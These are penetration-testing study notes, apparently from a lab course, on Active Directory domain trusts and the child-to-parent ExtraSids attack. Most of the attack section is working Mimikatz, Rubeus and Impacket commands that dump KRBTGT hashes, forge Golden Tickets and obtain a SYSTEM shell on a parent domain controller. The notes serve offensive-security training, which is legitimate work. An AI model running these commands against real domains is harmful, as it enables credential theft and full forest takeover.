# Domain Trusts Primer

## Domain Trusts Overview

A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:
- Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
- Cross-link: A trust between child domains to speed up authentication.
- External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
- Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- Forest: A transitive trust between two forest root domains.
- ESAE: A bastion forest used to manage Active Directory.

Reference: https://docs.microsoft.com/en-us/security/compass/esae-retirement

Trusts can be transitive or non-transitive.
- A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
- In a non-transitive trust, the child domain itself is the only one trusted.

![image](https://github.com/user-attachments/assets/6cdea1c8-7e64-483f-a410-9c40257ea91e)

## Trust Table Side By Side

| Transitive                                | Non-Transitive                          |
|-------------------------------------------|-----------------------------------------|
| Shared, 1 to many                         | Direct trust                            |
| The trust is shared with anyone in the forest | Not extended to next-level child domains |
| Forest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups |

An easy comparison to make can be package delivery to your house. For a transitive trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf. For a non-transitive trust, you have given strict orders with the package that no one other than the delivery service and you can handle the package, and only you can sign for it.

Trusts can be set up in two directions: one-way or two-way (bidirectional).
- One-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
- Bidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.

![image](https://github.com/user-attachments/assets/48c64892-e2f1-46e3-a63e-0f1e97ef9205)

## Enumerating Trust Relationships

- **Using Get-ADTrust**
```
Import-Module activedirectory
Get-ADTrust -Filter *
```

Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist, if any.

- **Checking for Existing Trusts using Get-DomainTrust**
```
Get-DomainTrust
```

PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.

- **Using Get-DomainTrustMapping**
```
Get-DomainTrustMapping
```

- **Checking Users in the Child Domain using Get-DomainUser**
```
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

Another tool we can use to get Domain Trust is `netdom`. The `netdom query` sub-command of the `netdom` command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.

- **Using netdom to query domain trust**
```
netdom query /domain:inlanefreight.local trust
```

- **Using netdom to query domain controllers**
```
netdom query /domain:inlanefreight.local dc
```

- **Using netdom to query workstations and servers**
```
netdom query /domain:inlanefreight.local workstation
```

We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.

![image](https://github.com/user-attachments/assets/e8306284-bfff-4f5e-957d-b802023c1b91)

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

## SID History Primer

The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.

This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

## ExtraSids Attack - Mimikatz

This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the `SIDHistory` to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

To perform this attack after compromising a child domain, we need the following:
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

Now we can gather each piece of data required to perform the **ExtraSids** attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.

Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.

Reference: https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html

- **Obtaining the KRBTGT Account's NT Hash using Mimikatz**
```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
We can use the PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz output above.

- **Using Get-DomainSID**
```
Get-DomainSID
```

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the `Get-ADGroup` cmdlet with a command such as `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

- **Obtaining Enterprise Admins Group's SID using Get-DomainGroup**
```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

At this point, we have gathered the following data points:
- The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
- The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: hacker
- The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
- The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

Before the attack, we can confirm no access to the file system of the DC in the parent domain.

- **Using ls to Confirm No Access**
```
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.

- **Creating a Golden Ticket with Mimikatz**
```
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.

- **Confirming a Kerberos Ticket is in Memory Using klist**
```
klist
```

From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.

- **Listing the Entire C: Drive of the Domain Controller**
```
ls \\academy-ea-dc01.inlanefreight.local\c$
```

## ExtraSids Attack - Rubeus

We can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.

- **Using ls to Confirm No Access Before Running Rubeus**
```
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Next, we will formulate our `Rubeus` command using the data we retrieved above. The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.

- **Creating a Golden Ticket using Rubeus**
```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

Once again, we can check that the ticket is in memory using the klist command.

- **Confirming the Ticket is in Memory Using klist**
```
klist
```

Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.

- **Performing a DCSync Attack**
```
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:
```
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

# Attacking Domain Trusts - Child -> Parent Trusts - from Linux

We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain

Once we have complete control of the child domain, LOGISTICS.INLANEFREIGHT.LOCAL, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.

- **Performing DCSync with secretsdump.py**
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

Next, we can use `lookupsid.py` from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, we can see that the SID of the lab_adm user would be S-1-5-21-2806153819-209893948-922872689-1001.

- **Performing SID Brute Forcing using lookupsid.py**
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

We can filter out the noise by piping the command output to grep and looking for just the domain SID.

- **Looking for the Domain SID**
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs.

Reference: https://adsecurity.org/?p=1001

- **Grabbing the Domain SID & Attaching to Enterprise Admin's RID**
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user hacker to forge our Golden Ticket.

- The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
- The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
- The name of a target user in the child domain (does not need to exist!): hacker
- The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
- The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

Next, we can use `ticketer.py` from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).

- **Constructing a Golden Ticket using ticketer.py**
```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

The ticket will be saved down to our system as a credential cache (`ccache`) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.

Reference: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html

- **Setting the KRB5CCNAME Environment Variable**
```
export KRB5CCNAME=hacker.ccache
```

We can check if we can successfully authenticate to the parent domain's Domain Controller using Impacket's version of Psexec. If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.

- **Getting a SYSTEM shell using Impacket's psexec.py**
```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

Impacket also has the tool `raiseChild.py`, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

- Obtains the SID for the Enterprise Admins group of the parent domain
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain

Finally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.

- **Performing the Attack with raiseChild.py**
```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

The script lists out the workflow and process in a comment as follows:
```
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```

Though tools such as `raiseChild.py` can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should always be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.

Just note:
```
secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
```
